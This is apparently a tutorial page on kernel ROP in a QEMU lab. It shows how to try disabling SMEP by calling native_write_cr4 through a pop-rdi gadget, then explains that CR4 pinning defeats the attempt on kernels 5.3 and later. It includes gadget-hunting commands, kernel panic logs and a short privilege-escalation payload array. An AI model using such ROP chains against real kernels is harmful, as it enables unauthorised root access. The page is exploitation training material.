---
description: An old technique
---

# Kernel ROP - Disabling SMEP

## Setup

Using the same setuo as [ret2usr](../kernel-rop-ret2usr.md), we make one single modification in `run.sh`:

```bash
#!/bin/sh

qemu-system-x86_64 \
    -kernel bzImage \
    -initrd initramfs.cpio \
    -append "console=ttyS0 quiet loglevel=3 oops=panic nokaslr pti=off" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -smp cores=2 \
    -cpu qemu64,+smep \        # add this line
    -s
```

Now if we load the VM and run our exploit from last time, we get a kernel panic.

<details>

<summary>Kernel Panic</summary>

```
[    1.628455] Yes? �U"��
[    1.628692] unable to execute userspace code (SMEP?) (uid: 1000)
[    1.631337] BUG: unable to handle page fault for address: 00000000004016b9
[    1.633781] #PF: supervisor instruction fetch in kernel mode
[    1.635878] #PF: error_code(0x0011) - permissions violation
[    1.637930] PGD 1296067 P4D 1296067 PUD 1295067 PMD 1291067 PTE 7c52025
[    1.639639] Oops: 0011 [#1] SMP
[    1.640632] CPU: 0 PID: 30 Comm: exploit Tainted: G           O       6.1.0 #6
[    1.646144] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.14.0-2 04/01/2014
[    1.647030] RIP: 0010:0x4016b9
[    1.648108] Code: Unable to access opcode bytes at 0x40168f.
[    1.648952] RSP: 0018:ffffb973400c7e68 EFLAGS: 00000286
[    1.649603] RAX: 0000000000000000 RBX: 00000000004a8220 RCX: 00000000ffffefff
[    1.650321] RDX: 00000000ffffefff RSI: 00000000ffffffea RDI: ffffb973400c7d08
[    1.651031] RBP: 0000000000000000 R08: ffffffffb7ca6448 R09: 0000000000004ffb
[    1.651743] R10: 000000000000009b R11: ffffffffb7c8f2e8 R12: ffffb973400c7ef8
[    1.652455] R13: 00007ffdfe225520 R14: 0000000000000000 R15: 0000000000000000
[    1.653218] FS:  0000000001b57380(0000) GS:ffff9c1b07800000(0000) knlGS:0000000000000000
[    1.654086] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.654685] CR2: 00000000004016b9 CR3: 0000000001292000 CR4: 00000000001006b0
[    1.655452] Call Trace:
[    1.656167]  <TASK>
[    1.656846]  ? do_syscall_64+0x3d/0x90
[    1.658073]  ? entry_SYSCALL_64_after_hwframe+0x46/0xb0
[    1.660144]  </TASK>
[    1.660835] Modules linked in: kernel_rop(O)
[    1.662360] CR2: 00000000004016b9
[    1.663362] ---[ end trace 0000000000000000 ]---
[    1.664702] RIP: 0010:0x4016b9
[    1.665386] Code: Unable to access opcode bytes at 0x40168f.
[    1.666167] RSP: 0018:ffffb973400c7e68 EFLAGS: 00000286
[    1.668501] RAX: 0000000000000000 RBX: 00000000004a8220 RCX: 00000000ffffefff
[    1.669777] RDX: 00000000ffffefff RSI: 00000000ffffffea RDI: ffffb973400c7d08
[    1.670710] RBP: 0000000000000000 R08: ffffffffb7ca6448 R09: 0000000000004ffb
[    1.672122] R10: 000000000000009b R11: ffffffffb7c8f2e8 R12: ffffb973400c7ef8
[    1.672795] R13: 00007ffdfe225520 R14: 0000000000000000 R15: 0000000000000000
[    1.673471] FS:  0000000001b57380(0000) GS:ffff9c1b07800000(0000) knlGS:0000000000000000
[    1.673854] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.674124] CR2: 00000000004016b9 CR3: 0000000001292000 CR4: 00000000001006b0
[    1.674576] Kernel panic - not syncing: Fatal exception
[    1.689999] Kernel Offset: 0x36200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[    1.695855] ---[ end Kernel panic - not syncing: Fatal exception ]---
```

</details>

It's worth noting what it looks like for the future - especially these 3 lines:

```
[    1.628692] unable to execute userspace code (SMEP?) (uid: 1000)
[    1.631337] BUG: unable to handle page fault for address: 00000000004016b9
[    1.633781] #PF: supervisor instruction fetch in kernel mode
```

## Overwriting CR4

So, instead of just returning back to userspace, we will try to overwrite CR4. Luckily, the kernel contains a very useful function for this: [`native_write_cr4(val)`](https://elixir.bootlin.com/linux/v6.1.96/source/arch/x86/kernel/cpu/common.c#L444). This function quite literally overwrites CR4.

Assuming KASLR is still off, we can get the address of this function via `/proc/kallsyms` (if we update `init` to log us in as `root`):

```
~ # cat /proc/kallsyms | grep native_write_cr4
ffffffff8102b6d0 T native_write_cr4
```

Ok, it's located at `0xffffffff8102b6d0`. What do we want to change CR4 to? If we look at the kernel panic above, we see this line:

```
[    1.654685] CR2: 00000000004016b9 CR3: 0000000001292000 CR4: 00000000001006b0
```

CR4 is currently `0x00000000001006b0`. If we remove the 20th bit (from the smallest, zero-indexed) we get `0x6b0`.

The last thing we need to do is find some gadgets. To do this, we have to convert the `bzImage` file into a `vmlinux` ELF file so that we can run `ropper` or `ROPgadget` on it. To do this, we can run [`extract-vmlinux`](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux), from the official Linux git repository.

```bash
$ ./extract-vmlinux bzImage > vmlinux
$ file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=3003c277e62b32aae3cfa84bb0d5775bd2941b14, stripped
```

```bash
$ ropper -f vmlinux --search "pop rdi"
0xffffffff811e08ec: pop rdi; ret;
```

### Putting it all together

All that changes in the exploit is the overflow:

```c
// overflow
uint64_t payload[20];

int i = 6;

payload[i++] = 0xffffffff811e08ec;      // pop rdi; ret
payload[i++] = 0x6b0;
payload[i++] = 0xffffffff8102b6d0;      // native_write_cr4
payload[i++] = (uint64_t) escalate;

write(fd, payload, 0);
```

We can then compile it and run.

## Failure

This fails. Why?

If we look at the resulting kernel panic, we meet an old friend:

```
[    1.542923] unable to execute userspace code (SMEP?) (uid: 0)
[    1.545224] BUG: unable to handle page fault for address: 00000000004016b9
[    1.547037] #PF: supervisor instruction fetch in kernel mode
```

SMEP is enabled again. How? If we [debug the exploit](../debugging-a-kernel-module.md), we definitely hit both the gadget and the call to `native_write_cr4()`. What gives?

Well, if we look at [the source](https://elixir.bootlin.com/linux/v6.1.96/source/arch/x86/kernel/cpu/common.c#L444), there's another feature:

```c
void __no_profile native_write_cr4(unsigned long val)
{
	unsigned long bits_changed = 0;

set_register:
	asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");

	if (static_branch_likely(&cr_pinning)) {
		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
			goto set_register;
		}
		/* Warn after we've corrected the changed bits. */
		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
			  bits_changed);
	}
}
```

Essentially, it will check if the `val` that we input disables any of the bits defined in `cr4_pinned_bits`. This value is [set on boot](https://elixir.bootlin.com/linux/v6.1.96/source/arch/x86/kernel/cpu/common.c#L507), and effectively stops "sensitive CR bits" from being modified. If they are, they are **unset**. Effectively, modifying CR4 doesn't work any longer - and hasn't since [version 5.3-rc1](https://elixir.bootlin.com/linux/v5.3-rc1/source/arch/x86/kernel/cpu/common.c#L431).
